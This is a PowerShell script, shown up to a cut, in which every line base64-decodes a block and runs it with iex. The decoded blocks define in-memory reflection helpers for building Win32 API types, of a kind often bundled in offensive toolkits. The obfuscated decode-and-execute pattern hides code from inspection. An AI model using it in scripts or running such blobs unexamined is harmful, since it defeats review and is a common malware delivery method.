iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gTmV3LUluTWVtb3J5TW9kdWxlIHsKICAgIFtEaWFnbm9zdGljcy5Db2RlQW5hbHlzaXMuU3VwcHJlc3NNZXNzYWdlQXR0cmlidXRlKCdQU1VzZVNob3VsZFByb2Nlc3NGb3JTdGF0ZUNoYW5naW5nRnVuY3Rpb25zJywgJycpXQogICAgW0NtZGxldEJpbmRpbmcoKV0KICAgIFBhcmFtICgKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMCldCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRNb2R1bGVOYW1lID0gW0d1aWRdOjpOZXdHdWlkKCkuVG9TdHJpbmcoKQogICAgKQogICAgJEFwcERvbWFpbiA9IFtSZWZsZWN0aW9uLkFzc2VtYmx5XS5Bc3NlbWJseS5HZXRUeXBlKCdTeXN0ZW0uQXBwRG9tYWluJykuR2V0UHJvcGVydHkoJ0N1cnJlbnREb21haW4nKS5HZXRWYWx1ZSgkbnVsbCwgQCgpKQogICAgJExvYWRlZEFzc2VtYmxpZXMgPSAkQXBwRG9tYWluLkdldEFzc2VtYmxpZXMoKQogICAgZm9yZWFjaCAoJEFzc2VtYmx5IGluICRMb2FkZWRBc3NlbWJsaWVzKSB7CiAgICAgICAgaWYgKCRBc3NlbWJseS5GdWxsTmFtZSAtYW5kICgkQXNzZW1ibHkuRnVsbE5hbWUuU3BsaXQoJywnKVswXSAtZXEgJE1vZHVsZU5hbWUpKSB7CiAgICAgICAgICAgIHJldHVybiAkQXNzZW1ibHkKICAgICAgICB9CiAgICB9CiAgICAkRHluQXNzZW1ibHkgPSBOZXctT2JqZWN0IFJlZmxlY3Rpb24uQXNzZW1ibHlOYW1lKCRNb2R1bGVOYW1lKQogICAgJERvbWFpbiA9ICRBcHBEb21haW4KICAgICRBc3NlbWJseUJ1aWxkZXIgPSAkRG9tYWluLkRlZmluZUR5bmFtaWNBc3NlbWJseSgkRHluQXNzZW1ibHksICdSdW4nKQogICAgJE1vZHVsZUJ1aWxkZXIgPSAkQXNzZW1ibHlCdWlsZGVyLkRlZmluZUR5bmFtaWNNb2R1bGUoJE1vZHVsZU5hbWUsICRGYWxzZSkKICAgIHJldHVybiAkTW9kdWxlQnVpbGRlcgp9Cg==")))

iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gZnVuYyB7CiAgICBQYXJhbSAoCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDAsIE1hbmRhdG9yeSA9ICRUcnVlKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICREbGxOYW1lLAogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAxLCBNYW5kYXRvcnkgPSAkVHJ1ZSldCiAgICAgICAgW3N0cmluZ10KICAgICAgICAkRnVuY3Rpb25OYW1lLAogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAyLCBNYW5kYXRvcnkgPSAkVHJ1ZSldCiAgICAgICAgW1R5cGVdCiAgICAgICAgJFJldHVyblR5cGUsCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDMpXQogICAgICAgIFtUeXBlW11dCiAgICAgICAgJFBhcmFtZXRlclR5cGVzLAogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSA0KV0KICAgICAgICBbUnVudGltZS5JbnRlcm9wU2VydmljZXMuQ2FsbGluZ0NvbnZlbnRpb25dCiAgICAgICAgJE5hdGl2ZUNhbGxpbmdDb252ZW50aW9uLAogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSA1KV0KICAgICAgICBbUnVudGltZS5JbnRlcm9wU2VydmljZXMuQ2hhclNldF0KICAgICAgICAkQ2hhcnNldCwKICAgICAgICBbU3RyaW5nXQogICAgICAgICRFbnRyeVBvaW50LAogICAgICAgIFtTd2l0Y2hdCiAgICAgICAgJFNldExhc3RFcnJvcgogICAgKQogICAgJFByb3BlcnRpZXMgPSBAewogICAgICAgIERsbE5hbWUgPSAkRGxsTmFtZQogICAgICAgIEZ1bmN0aW9uTmFtZSA9ICRGdW5jdGlvbk5hbWUKICAgICAgICBSZXR1cm5UeXBlID0gJFJldHVyblR5cGUKICAgIH0KICAgIGlmICgkUGFyYW1ldGVyVHlwZXMpIHsgJFByb3BlcnRpZXNbJ1BhcmFtZXRlclR5cGVzJ10gPSAkUGFyYW1ldGVyVHlwZXMgfQogICAgaWYgKCROYXRpdmVDYWxsaW5nQ29udmVudGlvbikgeyAkUHJvcGVydGllc1snTmF0aXZlQ2FsbGluZ0NvbnZlbnRpb24nXSA9ICROYXRpdmVDYWxsaW5nQ29udmVudGlvbiB9CiAgICBpZiAoJENoYXJzZXQpIHsgJFByb3BlcnRpZXNbJ0NoYXJzZXQnXSA9ICRDaGFyc2V0IH0KICAgIGlmICgkU2V0TGFzdEVycm9yKSB7ICRQcm9wZXJ0aWVzWydTZXRMYXN0RXJyb3InXSA9ICRTZXRMYXN0RXJyb3IgfQogICAgaWYgKCRFbnRyeVBvaW50KSB7ICRQcm9wZXJ0aWVzWydFbnRyeVBvaW50J10gPSAkRW50cnlQb2ludCB9CiAgICBOZXctT2JqZWN0IFBTT2JqZWN0IC1Qcm9wZXJ0eSAkUHJvcGVydGllcwp9Cg==")))

iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gQWRkLVdpbjMyVHlwZQp7CiAgICBbT3V0cHV0VHlwZShbSGFzaHRhYmxlXSldCiAgICBQYXJhbSgKICAgICAgICBbUGFyYW1ldGVyKE1hbmRhdG9yeT0kVHJ1ZSwgVmFsdWVGcm9tUGlwZWxpbmVCeVByb3BlcnR5TmFtZT0kVHJ1ZSldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkRGxsTmFtZSwKICAgICAgICBbUGFyYW1ldGVyKE1hbmRhdG9yeT0kVHJ1ZSwgVmFsdWVGcm9tUGlwZWxpbmVCeVByb3BlcnR5TmFtZT0kVHJ1ZSldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkRnVuY3Rpb25OYW1lLAogICAgICAgIFtQYXJhbWV0ZXIoVmFsdWVGcm9tUGlwZWxpbmVCeVByb3BlcnR5TmFtZT0kVHJ1ZSldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkRW50cnlQb2ludCwKICAgICAgICBbUGFyYW1ldGVyKE1hbmRhdG9yeT0kVHJ1ZSwgVmFsdWVGcm9tUGlwZWxpbmVCeVByb3BlcnR5TmFtZT0kVHJ1ZSldCiAgICAgICAgW1R5cGVdCiAgICAgICAgJFJldHVyblR5cGUsCiAgICAgICAgW1BhcmFtZXRlcihWYWx1ZUZyb21QaXBlbGluZUJ5UHJvcGVydHlOYW1lPSRUcnVlKV0KICAgICAgICBbVHlwZVtdXQogICAgICAgICRQYXJhbWV0ZXJUeXBlcywKICAgICAgICBbUGFyYW1ldGVyKFZhbHVlRnJvbVBpcGVsaW5lQnlQcm9wZXJ0eU5hbWU9JFRydWUpXQogICAgICAgIFtSdW50aW1lLkludGVyb3BTZXJ2aWNlcy5DYWxsaW5nQ29udmVudGlvbl0KICAgICAgICAkTmF0aXZlQ2FsbGluZ0NvbnZlbnRpb24gPSBbUnVudGltZS5JbnRlcm9wU2VydmljZXMuQ2FsbGluZ0NvbnZlbnRpb25dOjpTdGRDYWxsLAogICAgICAgIFtQYXJhbWV0ZXIoVmFsdWVGcm9tUGlwZWxpbmVCeVByb3BlcnR5TmFtZT0kVHJ1ZSldCiAgICAgICAgW1J1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLkNoYXJTZXRdCiAgICAgICAgJENoYXJzZXQgPSBbUnVudGltZS5JbnRlcm9wU2VydmljZXMuQ2hhclNldF06OkF1dG8sCiAgICAgICAgW1BhcmFtZXRlcihWYWx1ZUZyb21QaXBlbGluZUJ5UHJvcGVydHlOYW1lPSRUcnVlKV0KICAgICAgICBbU3dpdGNoXQogICAgICAgICRTZXRMYXN0RXJyb3IsCiAgICAgICAgW1BhcmFtZXRlcihNYW5kYXRvcnk9JFRydWUpXQogICAgICAgIFtWYWxpZGF0ZVNjcmlwdCh7KCRfIC1pcyBbUmVmbGVjdGlvbi5FbWl0Lk1vZHVsZUJ1aWxkZXJdKSAtb3IgKCRfIC1pcyBbUmVmbGVjdGlvbi5Bc3NlbWJseV0pfSldCiAgICAgICAgJE1vZHVsZSwKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsKCldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkTmFtZXNwYWNlID0gJycKICAgICkKICAgIEJFR0lOCiAgICB7CiAgICAgICAgJFR5cGVIYXNoID0gQHt9CiAgICB9CiAgICBQUk9DRVNTCiAgICB7CiAgICAgICAgaWYgKCRNb2R1bGUgLWlzIFtSZWZsZWN0aW9uLkFzc2VtYmx5XSkKICAgICAgICB7CiAgICAgICAgICAgIGlmICgkTmFtZXNwYWNlKQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAkVHlwZUhhc2hbJERsbE5hbWVdID0gJE1vZHVsZS5HZXRUeXBlKCIkTmFtZXNwYWNlLiREbGxOYW1lIikKICAgICAgICAgICAgfQogICAgICAgICAgICBlbHNlCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICRUeXBlSGFzaFskRGxsTmFtZV0gPSAkTW9kdWxlLkdldFR5cGUoJERsbE5hbWUpCiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgZWxzZQogICAgICAgIHsKICAgICAgICAgICAgaWYgKCEkVHlwZUhhc2guQ29udGFpbnNLZXkoJERsbE5hbWUpKQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBpZiAoJE5hbWVzcGFjZSkKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAkVHlwZUhhc2hbJERsbE5hbWVdID0gJE1vZHVsZS5EZWZpbmVUeXBlKCIkTmFtZXNwYWNlLiREbGxOYW1lIiwgJ1B1YmxpYyxCZWZvcmVGaWVsZEluaXQnKQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgZWxzZQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICRUeXBlSGFzaFskRGxsTmFtZV0gPSAkTW9kdWxlLkRlZmluZVR5cGUoJERsbE5hbWUsICdQdWJsaWMsQmVmb3JlRmllbGRJbml0JykKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgICAgICAkTWV0aG9kID0gJFR5cGVIYXNoWyREbGxOYW1lXS5EZWZpbmVNZXRob2QoCiAgICAgICAgICAgICAgICAkRnVuY3Rpb25OYW1lLAogICAgICAgICAgICAgICAgJ1B1YmxpYyxTdGF0aWMsUGludm9rZUltcGwnLAogICAgICAgICAgICAgICAgJFJldHVyblR5cGUsCiAgICAgICAgICAgICAgICAkUGFyYW1ldGVyVHlwZXMpCiAgICAgICAgICAgICRpID0gMQogICAgICAgICAgICBmb3JlYWNoKCRQYXJhbWV0ZXIgaW4gJFBhcmFtZXRlclR5cGVzKQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBpZiAoJFBhcmFtZXRlci5Jc0J5UmVmKQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgIFt2b2lkXSAkTWV0aG9kLkRlZmluZVBhcmFtZXRlcigkaSwgJ091dCcsICRudWxsKQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgJGkrKwogICAgICAgICAgICB9CiAgICAgICAgICAgICREbGxJbXBvcnQgPSBbUnVudGltZS5JbnRlcm9wU2VydmljZXMuRGxsSW1wb3J0QXR0cmlidXRlXQogICAgICAgICAgICAkU2V0TGFzdEVycm9yRmllbGQgPSAkRGxsSW1wb3J0LkdldEZpZWxkKCdTZXRMYXN0RXJyb3InKQogICAgICAgICAgICAkQ2FsbGluZ0NvbnZlbnRpb25GaWVsZCA9ICREbGxJbXBvcnQuR2V0RmllbGQoJ0NhbGxpbmdDb252ZW50aW9uJykKICAgICAgICAgICAgJENoYXJzZXRGaWVsZCA9ICREbGxJbXBvcnQuR2V0RmllbGQoJ0NoYXJTZXQnKQogICAgICAgICAgICAkRW50cnlQb2ludEZpZWxkID0gJERsbEltcG9ydC5HZXRGaWVsZCgnRW50cnlQb2ludCcpCiAgICAgICAgICAgIGlmICgkU2V0TGFzdEVycm9yKSB7ICRTTEVWYWx1ZSA9ICRUcnVlIH0gZWxzZSB7ICRTTEVWYWx1ZSA9ICRGYWxzZSB9CiAgICAgICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0VudHJ5UG9pbnQnXSkgeyAkRXhwb3J0ZWRGdW5jTmFtZSA9ICRFbnRyeVBvaW50IH0gZWxzZSB7ICRFeHBvcnRlZEZ1bmNOYW1lID0gJEZ1bmN0aW9uTmFtZSB9CiAgICAgICAgICAgICRDb25zdHJ1Y3RvciA9IFtSdW50aW1lLkludGVyb3BTZXJ2aWNlcy5EbGxJbXBvcnRBdHRyaWJ1dGVdLkdldENvbnN0cnVjdG9yKFtTdHJpbmddKQogICAgICAgICAgICAkRGxsSW1wb3J0QXR0cmlidXRlID0gTmV3LU9iamVjdCBSZWZsZWN0aW9uLkVtaXQuQ3VzdG9tQXR0cmlidXRlQnVpbGRlcigkQ29uc3RydWN0b3IsCiAgICAgICAgICAgICAgICAkRGxsTmFtZSwgW1JlZmxlY3Rpb24uUHJvcGVydHlJbmZvW11dIEAoKSwgW09iamVjdFtdXSBAKCksCiAgICAgICAgICAgICAgICBbUmVmbGVjdGlvbi5GaWVsZEluZm9bXV0gQCgkU2V0TGFzdEVycm9yRmllbGQsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkQ2FsbGluZ0NvbnZlbnRpb25GaWVsZCwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRDaGFyc2V0RmllbGQsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkRW50cnlQb2ludEZpZWxkKSwKICAgICAgICAgICAgICAgIFtPYmplY3RbXV0gQCgkU0xFVmFsdWUsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgKFtSdW50aW1lLkludGVyb3BTZXJ2aWNlcy5DYWxsaW5nQ29udmVudGlvbl0gJE5hdGl2ZUNhbGxpbmdDb252ZW50aW9uKSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAoW1J1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLkNoYXJTZXRdICRDaGFyc2V0KSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkRXhwb3J0ZWRGdW5jTmFtZSkpCiAgICAgICAgICAgICRNZXRob2QuU2V0Q3VzdG9tQXR0cmlidXRlKCREbGxJbXBvcnRBdHRyaWJ1dGUpCiAgICAgICAgfQogICAgfQogICAgRU5ECiAgICB7CiAgICAgICAgaWYgKCRNb2R1bGUgLWlzIFtSZWZsZWN0aW9uLkFzc2VtYmx5XSkKICAgICAgICB7CiAgICAgICAgICAgIHJldHVybiAkVHlwZUhhc2gKICAgICAgICB9CiAgICAgICAgJFJldHVyblR5cGVzID0gQHt9CiAgICAgICAgZm9yZWFjaCAoJEtleSBpbiAkVHlwZUhhc2guS2V5cykKICAgICAgICB7CiAgICAgICAgICAgICRUeXBlID0gJFR5cGVIYXNoWyRLZXldLkNyZWF0ZVR5cGUoKQogICAgICAgICAgICAkUmV0dXJuVHlwZXNbJEtleV0gPSAkVHlwZQogICAgICAgIH0KICAgICAgICByZXR1cm4gJFJldHVyblR5cGVzCiAgICB9Cn0K")))

iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gcHNlbnVtIHsKICAgIFtPdXRwdXRUeXBlKFtUeXBlXSldCiAgICBQYXJhbSAoCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDAsIE1hbmRhdG9yeT0kVHJ1ZSldCiAgICAgICAgW1ZhbGlkYXRlU2NyaXB0KHsoJF8gLWlzIFtSZWZsZWN0aW9uLkVtaXQuTW9kdWxlQnVpbGRlcl0pIC1vciAoJF8gLWlzIFtSZWZsZWN0aW9uLkFzc2VtYmx5XSl9KV0KICAgICAgICAkTW9kdWxlLAogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAxLCBNYW5kYXRvcnk9JFRydWUpXQogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkRnVsbE5hbWUsCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDIsIE1hbmRhdG9yeT0kVHJ1ZSldCiAgICAgICAgW1R5cGVdCiAgICAgICAgJFR5cGUsCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDMsIE1hbmRhdG9yeT0kVHJ1ZSldCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbSGFzaHRhYmxlXQogICAgICAgICRFbnVtRWxlbWVudHMsCiAgICAgICAgW1N3aXRjaF0KICAgICAgICAkQml0ZmllbGQKICAgICkKICAgIGlmICgkTW9kdWxlIC1pcyBbUmVmbGVjdGlvbi5Bc3NlbWJseV0pCiAgICB7CiAgICAgICAgcmV0dXJuICgkTW9kdWxlLkdldFR5cGUoJEZ1bGxOYW1lKSkKICAgIH0KICAgICRFbnVtVHlwZSA9ICRUeXBlIC1hcyBbVHlwZV0KICAgICRFbnVtQnVpbGRlciA9ICRNb2R1bGUuRGVmaW5lRW51bSgkRnVsbE5hbWUsICdQdWJsaWMnLCAkRW51bVR5cGUpCiAgICBpZiAoJEJpdGZpZWxkKQogICAgewogICAgICAgICRGbGFnc0NvbnN0cnVjdG9yID0gW0ZsYWdzQXR0cmlidXRlXS5HZXRDb25zdHJ1Y3RvcihAKCkpCiAgICAgICAgJEZsYWdzQ3VzdG9tQXR0cmlidXRlID0gTmV3LU9iamVjdCBSZWZsZWN0aW9uLkVtaXQuQ3VzdG9tQXR0cmlidXRlQnVpbGRlcigkRmxhZ3NDb25zdHJ1Y3RvciwgQCgpKQogICAgICAgICRFbnVtQnVpbGRlci5TZXRDdXN0b21BdHRyaWJ1dGUoJEZsYWdzQ3VzdG9tQXR0cmlidXRlKQogICAgfQogICAgZm9yZWFjaCAoJEtleSBpbiAkRW51bUVsZW1lbnRzLktleXMpCiAgICB7CiAgICAgICAgJG51bGwgPSAkRW51bUJ1aWxkZXIuRGVmaW5lTGl0ZXJhbCgkS2V5LCAkRW51bUVsZW1lbnRzWyRLZXldIC1hcyAkRW51bVR5cGUpCiAgICB9CiAgICAkRW51bUJ1aWxkZXIuQ3JlYXRlVHlwZSgpCn0K")))

iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gZmllbGQgewogICAgUGFyYW0gKAogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAwLCBNYW5kYXRvcnk9JFRydWUpXQogICAgICAgIFtVSW50MTZdCiAgICAgICAgJFBvc2l0aW9uLAogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAxLCBNYW5kYXRvcnk9JFRydWUpXQogICAgICAgIFtUeXBlXQogICAgICAgICRUeXBlLAogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAyKV0KICAgICAgICBbVUludDE2XQogICAgICAgICRPZmZzZXQsCiAgICAgICAgW09iamVjdFtdXQogICAgICAgICRNYXJzaGFsQXMKICAgICkKICAgIEB7CiAgICAgICAgUG9zaXRpb24gPSAkUG9zaXRpb24KICAgICAgICBUeXBlID0gJFR5cGUgLWFzIFtUeXBlXQogICAgICAgIE9mZnNldCA9ICRPZmZzZXQKICAgICAgICBNYXJzaGFsQXMgPSAkTWFyc2hhbEFzCiAgICB9Cn0K")))

iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gc3RydWN0CnsKICAgIFtPdXRwdXRUeXBlKFtUeXBlXSldCiAgICBQYXJhbSAoCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDEsIE1hbmRhdG9yeT0kVHJ1ZSldCiAgICAgICAgW1ZhbGlkYXRlU2NyaXB0KHsoJF8gLWlzIFtSZWZsZWN0aW9uLkVtaXQuTW9kdWxlQnVpbGRlcl0pIC1vciAoJF8gLWlzIFtSZWZsZWN0aW9uLkFzc2VtYmx5XSl9KV0KICAgICAgICAkTW9kdWxlLAogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAyLCBNYW5kYXRvcnk9JFRydWUpXQogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkRnVsbE5hbWUsCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDMsIE1hbmRhdG9yeT0kVHJ1ZSldCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbSGFzaHRhYmxlXQogICAgICAgICRTdHJ1Y3RGaWVsZHMsCiAgICAgICAgW1JlZmxlY3Rpb24uRW1pdC5QYWNraW5nU2l6ZV0KICAgICAgICAkUGFja2luZ1NpemUgPSBbUmVmbGVjdGlvbi5FbWl0LlBhY2tpbmdTaXplXTo6VW5zcGVjaWZpZWQsCiAgICAgICAgW1N3aXRjaF0KICAgICAgICAkRXhwbGljaXRMYXlvdXQKICAgICkKICAgIGlmICgkTW9kdWxlIC1pcyBbUmVmbGVjdGlvbi5Bc3NlbWJseV0pCiAgICB7CiAgICAgICAgcmV0dXJuICgkTW9kdWxlLkdldFR5cGUoJEZ1bGxOYW1lKSkKICAgIH0KICAgIFtSZWZsZWN0aW9uLlR5cGVBdHRyaWJ1dGVzXSAkU3RydWN0QXR0cmlidXRlcyA9ICdBbnNpQ2xhc3MsCiAgICAgICAgQ2xhc3MsCiAgICAgICAgUHVibGljLAogICAgICAgIFNlYWxlZCwKICAgICAgICBCZWZvcmVGaWVsZEluaXQnCiAgICBpZiAoJEV4cGxpY2l0TGF5b3V0KQogICAgewogICAgICAgICRTdHJ1Y3RBdHRyaWJ1dGVzID0gJFN0cnVjdEF0dHJpYnV0ZXMgLWJvciBbUmVmbGVjdGlvbi5UeXBlQXR0cmlidXRlc106OkV4cGxpY2l0TGF5b3V0CiAgICB9CiAgICBlbHNlCiAgICB7CiAgICAgICAgJFN0cnVjdEF0dHJpYnV0ZXMgPSAkU3RydWN0QXR0cmlidXRlcyAtYm9yIFtSZWZsZWN0aW9uLlR5cGVBdHRyaWJ1dGVzXTo6U2VxdWVudGlhbExheW91dAogICAgfQogICAgJFN0cnVjdEJ1aWxkZXIgPSAkTW9kdWxlLkRlZmluZVR5cGUoJEZ1bGxOYW1lLCAkU3RydWN0QXR0cmlidXRlcywgW1ZhbHVlVHlwZV0sICRQYWNraW5nU2l6ZSkKICAgICRDb25zdHJ1Y3RvckluZm8gPSBbUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbEFzQXR0cmlidXRlXS5HZXRDb25zdHJ1Y3RvcnMoKVswXQogICAgJFNpemVDb25zdCA9IEAoW1J1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxBc0F0dHJpYnV0ZV0uR2V0RmllbGQoJ1NpemVDb25zdCcpKQogICAgJEZpZWxkcyA9IE5ldy1PYmplY3QgSGFzaHRhYmxlW10oJFN0cnVjdEZpZWxkcy5Db3VudCkKICAgIGZvcmVhY2ggKCRGaWVsZCBpbiAkU3RydWN0RmllbGRzLktleXMpCiAgICB7CiAgICAgICAgJEluZGV4ID0gJFN0cnVjdEZpZWxkc1skRmllbGRdWydQb3NpdGlvbiddCiAgICAgICAgJEZpZWxkc1skSW5kZXhdID0gQHtGaWVsZE5hbWUgPSAkRmllbGQ7IFByb3BlcnRpZXMgPSAkU3RydWN0RmllbGRzWyRGaWVsZF19CiAgICB9CiAgICBmb3JlYWNoICgkRmllbGQgaW4gJEZpZWxkcykKICAgIHsKICAgICAgICAkRmllbGROYW1lID0gJEZpZWxkWydGaWVsZE5hbWUnXQogICAgICAgICRGaWVsZFByb3AgPSAkRmllbGRbJ1Byb3BlcnRpZXMnXQogICAgICAgICRPZmZzZXQgPSAkRmllbGRQcm9wWydPZmZzZXQnXQogICAgICAgICRUeXBlID0gJEZpZWxkUHJvcFsnVHlwZSddCiAgICAgICAgJE1hcnNoYWxBcyA9ICRGaWVsZFByb3BbJ01hcnNoYWxBcyddCiAgICAgICAgJE5ld0ZpZWxkID0gJFN0cnVjdEJ1aWxkZXIuRGVmaW5lRmllbGQoJEZpZWxkTmFtZSwgJFR5cGUsICdQdWJsaWMnKQogICAgICAgIGlmICgkTWFyc2hhbEFzKQogICAgICAgIHsKICAgICAgICAgICAgJFVubWFuYWdlZFR5cGUgPSAkTWFyc2hhbEFzWzBdIC1hcyAoW1J1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLlVubWFuYWdlZFR5cGVdKQogICAgICAgICAgICBpZiAoJE1hcnNoYWxBc1sxXSkKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgJFNpemUgPSAkTWFyc2hhbEFzWzFdCiAgICAgICAgICAgICAgICAkQXR0cmliQnVpbGRlciA9IE5ldy1PYmplY3QgUmVmbGVjdGlvbi5FbWl0LkN1c3RvbUF0dHJpYnV0ZUJ1aWxkZXIoJENvbnN0cnVjdG9ySW5mbywKICAgICAgICAgICAgICAgICAgICAkVW5tYW5hZ2VkVHlwZSwgJFNpemVDb25zdCwgQCgkU2l6ZSkpCiAgICAgICAgICAgIH0KICAgICAgICAgICAgZWxzZQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAkQXR0cmliQnVpbGRlciA9IE5ldy1PYmplY3QgUmVmbGVjdGlvbi5FbWl0LkN1c3RvbUF0dHJpYnV0ZUJ1aWxkZXIoJENvbnN0cnVjdG9ySW5mbywgW09iamVjdFtdXSBAKCRVbm1hbmFnZWRUeXBlKSkKICAgICAgICAgICAgfQogICAgICAgICAgICAkTmV3RmllbGQuU2V0Q3VzdG9tQXR0cmlidXRlKCRBdHRyaWJCdWlsZGVyKQogICAgICAgIH0KICAgICAgICBpZiAoJEV4cGxpY2l0TGF5b3V0KSB7ICROZXdGaWVsZC5TZXRPZmZzZXQoJE9mZnNldCkgfQogICAgfQogICAgJFNpemVNZXRob2QgPSAkU3RydWN0QnVpbGRlci5EZWZpbmVNZXRob2QoJ0dldFNpemUnLAogICAgICAgICdQdWJsaWMsIFN0YXRpYycsCiAgICAgICAgW0ludF0sCiAgICAgICAgW1R5cGVbXV0gQCgpKQogICAgJElMR2VuZXJhdG9yID0gJFNpemVNZXRob2QuR2V0SUxHZW5lcmF0b3IoKQogICAgJElMR2VuZXJhdG9yLkVtaXQoW1JlZmxlY3Rpb24uRW1pdC5PcENvZGVzXTo6TGR0b2tlbiwgJFN0cnVjdEJ1aWxkZXIpCiAgICAkSUxHZW5lcmF0b3IuRW1pdChbUmVmbGVjdGlvbi5FbWl0Lk9wQ29kZXNdOjpDYWxsLAogICAgICAgIFtUeXBlXS5HZXRNZXRob2QoJ0dldFR5cGVGcm9tSGFuZGxlJykpCiAgICAkSUxHZW5lcmF0b3IuRW1pdChbUmVmbGVjdGlvbi5FbWl0Lk9wQ29kZXNdOjpDYWxsLAogICAgICAgIFtSdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXS5HZXRNZXRob2QoJ1NpemVPZicsIFtUeXBlW11dIEAoW1R5cGVdKSkpCiAgICAkSUxHZW5lcmF0b3IuRW1pdChbUmVmbGVjdGlvbi5FbWl0Lk9wQ29kZXNdOjpSZXQpCiAgICAkSW1wbGljaXRDb252ZXJ0ZXIgPSAkU3RydWN0QnVpbGRlci5EZWZpbmVNZXRob2QoJ29wX0ltcGxpY2l0JywKICAgICAgICAnUHJpdmF0ZVNjb3BlLCBQdWJsaWMsIFN0YXRpYywgSGlkZUJ5U2lnLCBTcGVjaWFsTmFtZScsCiAgICAgICAgJFN0cnVjdEJ1aWxkZXIsCiAgICAgICAgW1R5cGVbXV0gQChbSW50UHRyXSkpCiAgICAkSUxHZW5lcmF0b3IyID0gJEltcGxpY2l0Q29udmVydGVyLkdldElMR2VuZXJhdG9yKCkKICAgICRJTEdlbmVyYXRvcjIuRW1pdChbUmVmbGVjdGlvbi5FbWl0Lk9wQ29kZXNdOjpOb3ApCiAgICAkSUxHZW5lcmF0b3IyLkVtaXQoW1JlZmxlY3Rpb24uRW1pdC5PcENvZGVzXTo6TGRhcmdfMCkKICAgICRJTEdlbmVyYXRvcjIuRW1pdChbUmVmbGVjdGlvbi5FbWl0Lk9wQ29kZXNdOjpMZHRva2VuLCAkU3RydWN0QnVpbGRlcikKICAgICRJTEdlbmVyYXRvcjIuRW1pdChbUmVmbGVjdGlvbi5FbWl0Lk9wQ29kZXNdOjpDYWxsLAogICAgICAgIFtUeXBlXS5HZXRNZXRob2QoJ0dldFR5cGVGcm9tSGFuZGxlJykpCiAgICAkSUxHZW5lcmF0b3IyLkVtaXQoW1JlZmxlY3Rpb24uRW1pdC5PcENvZGVzXTo6Q2FsbCwKICAgICAgICBbUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF0uR2V0TWV0aG9kKCdQdHJUb1N0cnVjdHVyZScsIFtUeXBlW11dIEAoW0ludFB0cl0sIFtUeXBlXSkpKQogICAgJElMR2VuZXJhdG9yMi5FbWl0